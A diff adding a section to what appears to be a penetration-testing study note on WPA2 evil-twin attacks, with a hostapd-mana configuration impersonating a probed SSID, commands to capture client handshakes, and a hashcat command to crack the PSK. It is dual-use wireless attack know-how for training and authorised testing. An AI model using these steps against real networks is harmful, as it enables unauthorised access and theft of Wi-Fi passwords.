@@ -9,7 +9,48 @@ In an evil twin attack, you create a [fake AP](../../OPN-attacks/fake-AP.md) wit
 In order for the attack to work, clients have to be using devices which are configured *to accept invalid server certificates* or they have to *manually accept* the evil twin's invalid certificate.
 
 If you know the PSK for an AP, you can also use an evil twin attack to setup an AP that *authenticates clients with the same PSK* and use that to perform attacks against clients. If you don't have the PSK, you can create the fake AP using the [OPN](../OPN-attacks/fake-AP.md) network method and wait for clients to connect.
-## Attack
+## Attack (without PSK) w/ `hostapd-mana`
+To get the PSK for the true evil-twin attack, we can set up a fake AP on a fake WPA2 network. To do that, we'll use `hostapd-mana` to capture handshakes for the clients searching for our fake network.
+### What network should we impersonate?
+First, monitor the network with `airodump-ng`. If you see some SSIDs listed in the probes section for some clients (but not listed as active APs in the top section of the output), then you know those clients likely *previously connected to those networks and they no longer exist*. 
+![](../CWP-pics/evil-twin-1.png)
+You can still get the password for these networks by tricking clients into connecting to you (via their PNL- Preferred Network List kind of like a [karma attack](../OPN-attacks/karma-attack.md)).
+### Steps
+#### 1. Edit the `hostapd` configuration
+Edit or create the file called `/etc/hostapd/hostapd.conf` (maybe make a backup of the OG first). In this example, we're targeting the `wifi-offices` network/SSID:
+```bash
+interface=wlan2
+driver=nl80211
+hw_mode=g
+channel=1
+ssid=wifi-offices
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+```
+- `interface`: the interface you want to use
+- `ssid`: of the network you want to attack
+- `mana_wpaout`: the output file you want to create which can always be the same but it's better to separate them to avoid confusion
+- `wpa_passphrase`: **NOTE** that we are giving it a random passphrase/ PSK right now (`12345678`)
+#### 2. Start the AP
+Use `hostapd-mana` to start the AP. It will automatically capture and then output any handshakes it captures:
+```bash
+hostapd-mana hostapd.conf
+```
+You should stop the attack as soon as you see the message `AP-STA-POSSIBLE-PSK-MISMATCH`. When you capture handshakes, the output looks like this:
+![](../CWP-pics/evil-twin-2.png)
+#### 3. Crack the handshakes
+`hostapd-mana` will create a file called `hostapd.hccapx` (the output file we configured in `hostapd.conf`). We need to get the handshakes out of this file and put them in a format that works with [hashcat](../../cybersecurity/TTPs/cracking/tools/hashcat.md). The following bash one-liner will do that:
+```bash
+cat hostapd.hccapx | head -n 1 | awk {'print $3'} >> hostapd.22000
+```
+Now that we have a suitable file (`hostapd.22000`) we can crack the PSKs using hashcat:
+```bash
+hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force
+```
+## Attack (with PSK)
 To set up a [WPA/WPA2](../../networking/wifi/WPA-WPA2.md)-PSK evil twin (when you already know the PSK/password) do the following:
 #### 1. Create `hostapd` config file
 Create the following `.conf` file for `hostapd`:
